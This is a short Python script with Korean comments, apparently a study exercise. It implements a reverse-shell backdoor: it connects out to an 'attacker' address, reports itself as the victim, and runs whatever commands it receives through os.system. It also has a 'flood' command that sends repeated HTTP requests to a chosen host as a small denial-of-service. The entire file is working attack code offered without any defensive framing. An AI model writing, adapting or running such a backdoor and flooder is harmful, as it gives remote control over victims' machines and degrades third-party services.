import os,socket,sys,subprocess

attacker = ('127.0.0.1', 80)
s = socket.socket()
s.connect(attacker)
s.send(b"Hello, this is victim.") # 빅팀에서 접속했다는 의미

while True:
  data = s.recv(1024).decode().strip() # strip은 불필요한 공백을 제거
  # 받은 데이터가 q라면 exit
  if 'q' == data:
    result = 'program exited'
    s.send(result.encode())
    print(result)
    break
  
  # 받은 데이터가 어떤 값으로 시작하는지 식별
  if data.startswith('cd '):
    os.chdir(data[3:])
    result = 'moved to ' + str(os.getcwd())
    s.send(result.encode())
  elif data.startswith('flood '):
    _, ip, port = data.split()
    port = int(port)
    
    get_request = f'''GET / HTTP/1.1\r\n
User-Agent: Mozilla/4.0\r\n
Host:{ip}:{port}\r\n'''

    for i in range(20):
        try:
            with socket.socket() as dos_s:
                dos_s.connect((ip,port))
                dos_s.send(get_request.encode())
                data = dos_s.recv(1024).decode()
                print(data[:10])
        except Exception as e:
            print("[err]dos_s", e)
    
  else:
    os.system(data)
    s.send(b"excuted" + data.encode())
  

s.close()